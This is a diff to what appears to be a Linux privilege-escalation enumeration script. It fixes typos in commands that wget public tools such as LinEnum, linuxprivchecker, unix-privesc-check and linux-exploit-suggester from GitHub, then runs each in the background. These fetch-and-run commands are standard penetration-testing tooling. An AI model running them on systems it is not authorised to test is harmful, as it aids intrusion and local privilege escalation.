@@ -49,17 +49,17 @@ find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -15 -type f -print
 #LinEnum
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
 chmod +x linenum.sh
-./linenum.sh -t > linenum.txt $ 
+./linenum.sh -t > linenum.txt &
 
 #LinPrivCheck
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py -O linpriv.py
 chmod +x linpriv.py
-./linpriv.py > linpriv.txt $ 
+./linpriv.py > linpriv.txt &
 
 #UnixPrivCheck
 wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh -O upc.sh
 chmod +x upc.sh
-./upc.sh > upc.txt $
+./upc.sh > upc.txt &
 
 
 #PRIVESC AND EXPLOIT SCRIPTS
@@ -67,11 +67,11 @@ chmod +x upc.sh
 #Download and run LES - checks for kernel exploits and LPE's 
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 chmod +x les.sh
-./les.sh > les.txt $
+./les.sh > les.txt &
 
 #LinExpSugg
-wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl - O expsug.pl
+wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl -O expsug.pl
 chmod +x expsug.pl
-./expsug.pl > expsug.txt $
+./expsug.pl > expsug.txt &
 
 
